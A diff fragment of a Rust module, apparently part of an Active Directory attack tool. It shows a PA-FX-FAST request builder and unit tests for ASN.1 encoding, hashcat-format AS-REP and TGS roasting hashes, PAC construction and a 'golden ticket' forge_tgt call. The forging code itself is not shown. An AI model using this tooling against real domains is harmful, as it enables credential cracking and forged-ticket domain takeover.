+    // KrbFastEncPart ::= SEQUENCE {
+    //     enc-body [0] OCTET STRING (KDC-REQ body DER),
+    //     nonce    [1] UInt32
+    // }
+    let nonce: u32 = rand::random();
+    let enc_body = asn1_implicit_primitive(0, params.inner_req_body_der);
+    let nonce_der = asn1_implicit_primitive(1, &asn1_integer(nonce as i64));
+    let fast_enc_part = asn1_sequence(&[&enc_body, &nonce_der]);
+
+    // ── Step 4: Encrypt KrbFastEncPart with armor key ───────────
+    // Per RFC 6806 §5.4.1: armor key = TGT session key directly.
+    // Key usage 10 = PA-FX-FAST enc-part encryption.
+    let encrypted_enc_part = cipher.encrypt(params.tgt_session_key, 10, &fast_enc_part);
+
+    // EncryptedData wrapping
+    let enc_part_etype = asn1_context_tag(0, &asn1_integer(params.session_key_etype as i64));
+    let enc_part_cipher = asn1_context_tag(2, &encrypted_enc_part);
+    let enc_part_encrypted_data = asn1_sequence(&[&enc_part_etype, &enc_part_cipher]);
+
+    // ── Step 5: Build KrbFastRequest ────────────────────────────
+    // KrbFastRequest ::= SEQUENCE {
+    //     armor    [0] KrbFastArmor OPTIONAL,
+    //     enc-part [2] EncryptedData
+    // }
+    let armor_field = asn1_implicit_constructed(0, &fast_armor);
+    let enc_part_field = asn1_implicit_constructed(2, &enc_part_encrypted_data);
+    let fast_request = asn1_sequence(&[&armor_field, &enc_part_field]);
+
+    // ── Step 6: Wrap in PA-DATA (type = 136 = PA_FX_FAST) ─────
+    // PA-DATA ::= SEQUENCE {
+    //     padata-type  [1] INTEGER,
+    //     padata-value [2] OCTET STRING
+    // }
+    let pa_type = asn1_implicit_primitive(1, &asn1_integer(136));
+    let pa_value = asn1_implicit_primitive(2, &fast_request);
+    let pa_data = asn1_sequence(&[&pa_type, &pa_value]);
+
+    Ok(pa_data)
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use chrono::{TimeZone, Utc};
+
+    // ─── normalize_username / normalize_realm ────────────────
+
+    #[test]
+    fn test_normalize_username_plain() {
+        assert_eq!(normalize_username("administrator"), "administrator");
+    }
+
+    #[test]
+    fn test_normalize_username_upn() {
+        assert_eq!(normalize_username("admin@corp.local"), "admin");
+    }
+
+    #[test]
+    fn test_normalize_username_downlevel() {
+        assert_eq!(normalize_username("CORP\\administrator"), "administrator");
+    }
+
+    #[test]
+    fn test_normalize_realm() {
+        assert_eq!(normalize_realm("corp.local"), "CORP.LOCAL");
+        assert_eq!(normalize_realm("CORP.LOCAL"), "CORP.LOCAL");
+    }
+
+    // ─── KRB-ERROR codes ────────────────────────────────────
+
+    #[test]
+    fn test_krb_error_to_string_known_codes() {
+        assert_eq!(
+            krb_error_to_string(6),
+            "KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found"
+        );
+        assert_eq!(
+            krb_error_to_string(24),
+            "KDC_ERR_PREAUTH_FAILED - Pre-auth failed (wrong password/hash)"
+        );
+        assert_eq!(
+            krb_error_to_string(25),
+            "KDC_ERR_PREAUTH_REQUIRED - Pre-auth required"
+        );
+        assert_eq!(
+            krb_error_to_string(50),
+            "KDC_ERR_BADOPTION - Bad option in request"
+        );
+        assert_eq!(
+            krb_error_to_string(31),
+            "KRB_AP_ERR_SKEW - Clock skew too great"
+        );
+    }
+
+    #[test]
+    fn test_krb_error_to_string_unknown() {
+        assert_eq!(krb_error_to_string(0xff), "UNKNOWN_ERROR");
+    }
+
+    // ─── ASN.1 DER helpers ──────────────────────────────────
+
+    #[test]
+    fn test_asn1_length_short() {
+        // Length < 128 → single byte
+        assert_eq!(asn1_length(0), vec![0x00]);
+        assert_eq!(asn1_length(1), vec![0x01]);
+        assert_eq!(asn1_length(0x7f), vec![0x7f]);
+    }
+
+    #[test]
+    fn test_asn1_length_long() {
+        // Length ≥ 128 → multi-byte: high bit set + number of length bytes
+        let result = asn1_length(0x80);
+        assert_eq!(result.len(), 2);
+        assert_eq!(result[0], 0x81);
+        assert_eq!(result[1], 0x80);
+    }
+
+    #[test]
+    fn test_asn1_length_255() {
+        let result = asn1_length(255);
+        // 255 < 256 → single length byte: high-bit + value
+        assert_eq!(result[0], 0x81);
+        assert_eq!(result[1], 0xff);
+    }
+
+    #[test]
+    fn test_asn1_length_65535() {
+        let result = asn1_length(65535);
+        // 65535 >= 256 → two length bytes
+        assert_eq!(result[0], 0x82);
+        assert_eq!(result[1], 0xff);
+        assert_eq!(result[2], 0xff);
+    }
+
+    #[test]
+    fn test_asn1_integer_zero() {
+        let der = asn1_integer(0);
+        // Tag 0x02, length 1, value 0x00
+        assert_eq!(der, vec![0x02, 0x01, 0x00]);
+    }
+
+    #[test]
+    fn test_asn1_integer_positive() {
+        let der = asn1_integer(42);
+        assert_eq!(der, vec![0x02, 0x01, 0x2a]);
+    }
+
+    #[test]
+    fn test_asn1_integer_127() {
+        let der = asn1_integer(127);
+        // Should NOT have a leading zero — 127 fits in one byte MSB=0
+        assert_eq!(der, vec![0x02, 0x01, 0x7f]);
+    }
+
+    #[test]
+    fn test_asn1_integer_128() {
+        let der = asn1_integer(128);
+        // 128 = 0x80 — needs leading zero to not be sign-extended
+        assert_eq!(der, vec![0x02, 0x02, 0x00, 0x80]);
+    }
+
+    #[test]
+    fn test_asn1_integer_negative() {
+        let der = asn1_integer(-1);
+        assert_eq!(der, vec![0x02, 0x01, 0xff]);
+    }
+
+    #[test]
+    fn test_asn1_integer_256() {
+        let der = asn1_integer(256);
+        assert_eq!(der, vec![0x02, 0x02, 0x01, 0x00]);
+    }
+
+    #[test]
+    fn test_asn1_octet_string() {
+        let der = asn1_octet_string(b"hello");
+        assert_eq!(der, vec![0x04, 0x05, 0x68, 0x65, 0x6c, 0x6c, 0x6f]);
+    }
+
+    #[test]
+    fn test_asn1_octet_string_empty() {
+        let der = asn1_octet_string(b"");
+        assert_eq!(der, vec![0x04, 0x00]);
+    }
+
+    #[test]
+    fn test_asn1_context_tag() {
+        let der = asn1_context_tag(0, &[0x05, 0x00]);
+        // Tag 0xa0, length 2
+        assert_eq!(der, vec![0xa0, 0x02, 0x05, 0x00]);
+    }
+
+    #[test]
+    fn test_asn1_context_tag_compound() {
+        let der = asn1_context_tag(3, &[0x02, 0x01, 0x2a]);
+        // Tag 0xa3, length 3
+        assert_eq!(der, vec![0xa3, 0x03, 0x02, 0x01, 0x2a]);
+    }
+
+    #[test]
+    fn test_asn1_application_tag() {
+        let der = asn1_application_tag(0, &[0x02, 0x01, 0x05]);
+        // Tag 0x60, length 3
+        assert_eq!(der, vec![0x60, 0x03, 0x02, 0x01, 0x05]);
+    }
+
+    #[test]
+    fn test_asn1_sequence_single() {
+        let inner = asn1_integer(5);
+        let seq = asn1_sequence(&[&inner]);
+        // Tag 0x30, length passes through
+        assert_eq!(seq[0], 0x30);
+        assert_eq!(seq[1], inner.len() as u8);
+    }
+
+    #[test]
+    fn test_asn1_sequence_multiple() {
+        let a = asn1_integer(1);
+        let b = asn1_integer(2);
+        let seq = asn1_sequence(&[&a, &b]);
+        assert_eq!(seq[0], 0x30);
+    }
+
+    #[test]
+    fn test_asn1_bitstring_u32() {
+        let bits = asn1_bitstring_u32(0x0001_0000);
+        // Tag 0x03, content includes unused-bits byte + 4 bytes of payload
+        assert_eq!(bits[0], 0x03);
+        assert_eq!(bits[2], 0x00); // unused bits padding
+    }
+
+    #[test]
+    fn test_asn1_general_string() {
+        let s = asn1_general_string("test");
+        // Tag 0x1b
+        assert_eq!(s[0], 0x1b);
+        assert_eq!(&s[2..], b"test");
+    }
+
+    #[test]
+    fn test_asn1_generalized_time() {
+        let der = asn1_generalized_time("20250101000000Z");
+        assert_eq!(der[0], 0x18);
+        assert_eq!(&der[2..], b"20250101000000Z");
+    }
+
+    #[test]
+    fn test_asn1_sequence_of_general_strings() {
+        let strings = &["KRBTGT", "CORP.LOCAL"];
+        let seq = asn1_sequence_of_general_strings(strings);
+        assert_eq!(seq[0], 0x30);
+    }
+
+    #[test]
+    fn test_asn1_sequence_raw_bytes() {
+        let inner = asn1_integer(42);
+        let raw = asn1_sequence_raw_bytes(&inner);
+        assert_eq!(raw[0], 0x30);
+        assert_eq!(&raw[2..], &inner);
+    }
+
+    #[test]
+    fn test_asn1_sequence_raw() {
+        let a = asn1_integer(1);
+        let b = asn1_integer(2);
+        let raw = asn1_sequence_raw(&[&a, &b]);
+        assert_eq!(raw[0], 0x30);
+    }
+
+    // ─── Hashcat format strings ──────────────────────────────
+
+    #[test]
+    fn test_hashcat_checksum_len_known() {
+        assert_eq!(hashcat_checksum_len(23), 16); // RC4
+        assert_eq!(hashcat_checksum_len(17), 12); // AES128
+        assert_eq!(hashcat_checksum_len(18), 12); // AES256
+    }
+
+    #[test]
+    fn test_hashcat_checksum_len_unknown() {
+        // Non-RC4 etypes return 12 (AES default)
+        assert_eq!(hashcat_checksum_len(0), 12);
+    }
+
+    #[test]
+    fn test_format_asrep_hash_string_rc4() {
+        let hash = format_asrep_hash_string(23, "admin", "CORP.LOCAL", &[0xAB; 16]);
+        assert!(hash.starts_with("$krb5asrep$23$"));
+        assert!(hash.contains("admin@CORP.LOCAL"));
+    }
+
+    #[test]
+    fn test_format_tgs_hash_string_rc4() {
+        let hash = format_tgs_hash_string(
+            23,
+            "admin",
+            "CORP.LOCAL",
+            "HTTP/server.corp.local",
+            &[0xCD; 16],
+        );
+        // Format: $krb5tgs$23$*admin$CORP.LOCAL$HTTP/server.corp.local$*cd...cd$
+        assert!(hash.starts_with("$krb5tgs$23$*admin$CORP.LOCAL$HTTP/server.corp.local"));
+        // cipher is 16 bytes → checksum = 16 bytes (32 hex chars), edata2 empty
+        // hash ends with the 32-char hex checksum and a trailing $
+        let hex_checksum = "cdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcd";
+        assert!(hash.contains(hex_checksum));
+        assert!(hash.ends_with("$"));
+    }
+
+    // ─── SID parsing ─────────────────────────────────────────
+
+    #[test]
+    fn test_validate_sid_format_valid() {
+        assert!(validate_sid_format("S-1-5-21-1234-5678-9012-500").is_ok());
+    }
+
+    #[test]
+    fn test_validate_sid_format_invalid_prefix() {
+        assert!(validate_sid_format("J-1-5-21-1234").is_err());
+    }
+
+    #[test]
+    fn test_validate_sid_format_too_short() {
+        assert!(validate_sid_format("S-1-5").is_err());
+    }
+
+    #[test]
+    fn test_parse_sid_to_bytes_known() {
+        // S-1-5-21-3623811015-3361044348-30300820-500
+        // Revision=1, IdentifierAuthority=5, 5 subauthorities: 21, 3623811015, 3361044348, 30300820, 500
+        let sid_bytes = parse_sid_to_bytes("S-1-5-21-3623811015-3361044348-30300820-500");
+        assert_eq!(sid_bytes[0], 1); // revision
+        assert_eq!(sid_bytes[1], 5); // subAuthorityCount
+        // IdentifierAuthority: 5 (NT Authority) → big-endian 0x00 0x00 0x00 0x00 0x00 0x05
+        assert_eq!(&sid_bytes[2..8], &[0x00, 0x00, 0x00, 0x00, 0x00, 0x05]);
+        // subAuthority[0] = 21 → 0x15 0x00 0x00 0x00 (little-endian)
+        assert_eq!(sid_bytes[8], 0x15);
+        assert_eq!(sid_bytes[9], 0x00);
+    }
+
+    #[test]
+    fn test_parse_sid_to_bytes_rid_extraction() {
+        // S-1-5-21-100-200-300-512 → 5 components, RID=512
+        let sid_bytes = parse_sid_to_bytes("S-1-5-21-100-200-300-512");
+        // Last 4 bytes (little-endian) = RID
+        let rid_bytes = &sid_bytes[sid_bytes.len() - 4..];
+        let rid = u32::from_le_bytes([rid_bytes[0], rid_bytes[1], rid_bytes[2], rid_bytes[3]]);
+        assert_eq!(rid, 512);
+    }
+
+    // ─── Time conversion ─────────────────────────────────────
+
+    #[test]
+    fn test_chrono_to_filetime_unix_epoch() {
+        // Unix epoch 1970-01-01 should not overflow and produce a known value
+        let dt = Utc.with_ymd_and_hms(1970, 1, 1, 0, 0, 0).single().unwrap();
+        let ft = chrono_to_filetime(&dt);
+        // Known constant: 116_444_736_000_000_000 (offset between 1601-01-01 and 1970-01-01)
+        assert_eq!(ft, 116_444_736_000_000_000u64);
+    }
+
+    #[test]
+    fn test_chrono_to_filetime_modern() {
+        // 2025-01-01 00:00:00 UTC
+        let dt = Utc.with_ymd_and_hms(2025, 1, 1, 0, 0, 0).single().unwrap();
+        let ft = chrono_to_filetime(&dt);
+        // FILETIME = 100-ns intervals since 1601-01-01
+        let expected_unix_100ns = 1735689600u64 * 10_000_000; // Unix timestamp * 10M
+        let expected = expected_unix_100ns + 116_444_736_000_000_000;
+        assert_eq!(ft, expected);
+    }
+
+    #[test]
+    fn test_format_kerberos_time() {
+        let dt = Utc
+            .with_ymd_and_hms(2025, 6, 15, 14, 30, 0)
+            .single()
+            .unwrap();
+        assert_eq!(format_kerberos_time(&dt), "20250615143000Z");
+    }
+
+    // ─── KDC flags ──────────────────────────────────────────
+
+    #[test]
+    fn test_kdc_flags_forwardable() {
+        // KDC_OPT_FORWARDABLE = 0x40000000
+        let flags = kdc_flags(0x40000000);
+        // KerberosFlags.flags is a u32 in kerberos_asn1 v0.2
+        assert_eq!(flags.flags, 0x40000000u32);
+    }
+
+    #[test]
+    fn test_kdc_flags_default() {
+        let flags = kdc_flags(0);
+        assert_eq!(flags.flags, 0u32);
+    }
+
+    // ─── Session key generation ──────────────────────────────
+
+    #[test]
+    fn test_generate_session_key_rc4() {
+        let key = generate_session_key(23);
+        assert_eq!(key.len(), 16); // RC4 key = 16 bytes
+    }
+
+    #[test]
+    fn test_generate_session_key_aes128() {
+        let key = generate_session_key(17);
+        assert_eq!(key.len(), 16); // AES128 key = 16 bytes
+    }
+
+    #[test]
+    fn test_generate_session_key_aes256() {
+        let key = generate_session_key(18);
+        assert_eq!(key.len(), 32); // AES256 key = 32 bytes
+    }
+
+    // ─── PA-ENC-TIMESTAMP (real crypto, offline) ─────────────
+
+    #[test]
+    fn test_build_pa_enc_timestamp_produces_valid_padata() {
+        let key = vec![0x00u8; 16];
+        let pa_data = build_pa_enc_timestamp(&key, 23).unwrap();
+        // PA-DATA type 2 (PA-ENC-TIMESTAMP)
+        assert_eq!(pa_data.padata_type, 2);
+        // EncryptedData DER encoding should be non-empty
+        assert!(!pa_data.padata_value.is_empty());
+        // EncryptedData SEQUENCE starts with tag 0x30
+        assert_eq!(pa_data.padata_value[0], 0x30);
+    }
+
+    #[test]
+    fn test_build_pa_enc_timestamp_aes256() {
+        let key = vec![0xABu8; 32]; // AES256 key — 32 bytes
+        let pa_data = build_pa_enc_timestamp(&key, 18).unwrap();
+        assert_eq!(pa_data.padata_type, 2);
+        assert!(!pa_data.padata_value.is_empty());
+    }
+
+    // ─── PAC construction ────────────────────────────────────
+
+    #[test]
+    fn test_build_minimal_pac_produces_valid_structure() {
+        let pac = build_minimal_pac(
+            "S-1-5-21-123456789-123456789-123456789",
+            "Administrator",
+            500,
+            "CORP.LOCAL",
+        );
+        assert!(!pac.is_empty(), "PAC should not be empty");
+        // PAC header starts with 4-byte ULONG cBuffers + 4-byte ULONG Version
+        let count = u32::from_le_bytes([pac[0], pac[1], pac[2], pac[3]]);
+        // Minimal PAC includes only LOGON_INFORMATION buffer (type 1)
+        // Full forging builder adds CLIENT_INFO, SERVER_CKSUM, KDC_CKSUM separately
+        assert_eq!(count, 1, "Minimal PAC has 1 buffer (LOGON_INFORMATION)");
+        let version = u32::from_le_bytes([pac[4], pac[5], pac[6], pac[7]]);
+        assert_eq!(version, 0, "PAC Version should be 0");
+    }
+
+    #[test]
+    fn test_build_minimal_pac_contains_logon_info() {
+        let pac = build_minimal_pac("S-1-5-21-100-200-300", "testuser", 1000, "TEST.LOCAL");
+        let count = u32::from_le_bytes([pac[0], pac[1], pac[2], pac[3]]);
+        assert_eq!(count, 1);
+        // PAC_INFO_BUFFER: ulType(u32) + cbBufferSize(u32) + Offset(u64) = 16 bytes
+        let buf_type = u32::from_le_bytes([pac[8], pac[9], pac[10], pac[11]]);
+        assert_eq!(buf_type, 1, "First buffer should be LOGON_INFORMATION");
+        // Buffer data starts after header (8) + 1 buffer entry (16) = offset 24
+        let offset = u64::from_le_bytes([
+            pac[16], pac[17], pac[18], pac[19], pac[20], pac[21], pac[22], pac[23],
+        ]);
+        assert_eq!(offset, 24, "LOGON_INFO data should start at offset 24");
+    }
+
+    // ─── NDR encoding ────────────────────────────────────────
+
+    #[test]
+    fn test_ndr_write_conformant_string() {
+        let mut buf = Vec::new();
+        let input = "test";
+        // UTF-16LE encoding of "test"
+        let utf16_units: Vec<u16> = input.encode_utf16().collect();
+        let mut utf16_bytes: Vec<u8> = Vec::with_capacity(utf16_units.len() * 2);
+        for unit in &utf16_units {
+            utf16_bytes.extend_from_slice(&unit.to_le_bytes());
+        }
+        // Conformant string: max_count(4) + actual_count(4) + offset(4) + utf16_bytes + 2 null chars
+        ndr_write_conformant_string(&mut buf, &utf16_bytes);
+        assert!(!buf.is_empty(), "NDR string should not be empty");
+        // First 4 bytes = max count (includes null terminator)
+        let max_count = u32::from_le_bytes([buf[0], buf[1], buf[2], buf[3]]);
+        // Count of UTF-16 code units (not null-terminated) = 4
+        assert_eq!(max_count, input.len() as u32);
+    }
+
+    // ─── Golden ticket forge ─────────────────────────────────
+
+    #[test]
+    fn test_forge_tgt_produces_valid_kirbi() {
+        let krbtgt_hash = [0x00u8; 16]; // Invalid dummy hash, but should not panic
+        let result = forge_tgt(
+            "CORP.LOCAL",
+            "S-1-5-21-123456-123456-123456",
+            "Administrator",
+            500,
+            &krbtgt_hash,
+            23,
+        );
+        // Even with a dummy key, the function should construct valid DER
+        assert!(
+            result.is_ok(),
+            "forge_tgt should not fail with valid params"
+        );
+    }
+
+    // ─── Helper: hex_encode ──────────────────────────────────
+
+    #[test]
+    fn test_hex_encode_empty() {
+        assert_eq!(hex_encode(b""), "");
+    }
+
+    #[test]
+    fn test_hex_encode_simple() {
+        assert_eq!(hex_encode(&[0xde, 0xad, 0xbe, 0xef]), "deadbeef");
+    }
+
+    #[test]
+    fn test_hex_encode_uppercase() {
+        // hex_encode produces lowercase
+        assert_eq!(hex_encode(&[0xFF, 0x00]), "ff00");
+    }
 }
